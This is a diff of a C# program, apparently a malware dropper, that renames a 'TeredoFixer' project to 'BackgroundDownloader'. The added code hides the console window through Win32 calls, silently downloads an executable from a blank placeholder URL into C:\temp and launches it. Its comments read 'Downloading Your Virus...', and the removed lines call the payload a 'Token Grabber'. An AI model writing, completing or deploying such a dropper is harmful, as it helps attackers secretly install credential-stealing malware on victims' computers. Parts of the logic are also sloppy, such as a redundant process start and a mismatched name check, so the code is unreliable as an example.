@@ -8,63 +8,73 @@ using System.IO;
 using System.Threading;
 using System.Net;
 using System.ComponentModel;
+using System.Runtime.InteropServices;
 
-namespace TeredoFixer
+namespace BackgroundDownloader
 {
     class Program
     {
+        // Import DLL 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         public static AsyncCompletedEventHandler Completed { get; private set; }
 
         static void Main(string[] args)
         {
+            string name = ""; // Yourprogram name
+            string name_link = "";
+            Console.Title = Guid.NewGuid().ToString();
+            // hide the console for user
+            var handler = GetConsoleWindow();
+            ShowWindow(handler, 0);
             // Creating Tempfile
-            Console.Title = "Command Prompt";
             string temp = @"C:\temp\" + Guid.NewGuid();
             Directory.CreateDirectory(temp);
-            string grapped = temp + "\\YOUR FILE NAME.exe";
-            Console.ForegroundColor = ConsoleColor.DarkMagenta;
-            Console.WriteLine("Checking...");
+            string grapped = temp + $"\\{name_link}.exe";
+            // Trying to install.
             try
             {
-                // Downloading Token Grabber
+                // Downloading Your Virus...
                 WebClient webClient = new WebClient();
                 webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                 webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
-                webClient.DownloadFileAsync(new Uri("YOUR FILE HERE"), grapped);
-                Console.Clear();
-                Console.WriteLine("Injecting..");
+                // Download the file
+                webClient.DownloadFileAsync(new Uri($"{name}"), grapped);
             }
-            catch {
-                Console.WriteLine("FAILED");
+            catch
+            {
+                Environment.Exit(1);
             }
             void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
             {
-                
+
             }
- 
+            // if its Completed..
             void Completed(object sender, AsyncCompletedEventArgs e)
             {
+                // set var for process
+                var p = Process.Start(grapped);
                 // if it done
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.Clear();
-                Console.WriteLine("Checking...");
-                Process.Start(grapped);
+                p.Start();
+               
+                
+     
             }
             // checks if the program is running
-            if (Process.GetProcessesByName("YOUR FILE NAME.exe").Length > 0)
-            {
-               
-            }
+            if (Process.GetProcessesByName($"{name}.exe").Length > 0)
+            {          }
             // If its not running then do this
             else
             {
+                
                 Thread.Sleep(10000);
                 Console.Clear();
-                Console.WriteLine("Checking...");
-                Console.ForegroundColor = ConsoleColor.DarkRed;
                 Environment.Exit(1);
             }
-
 
         }
 
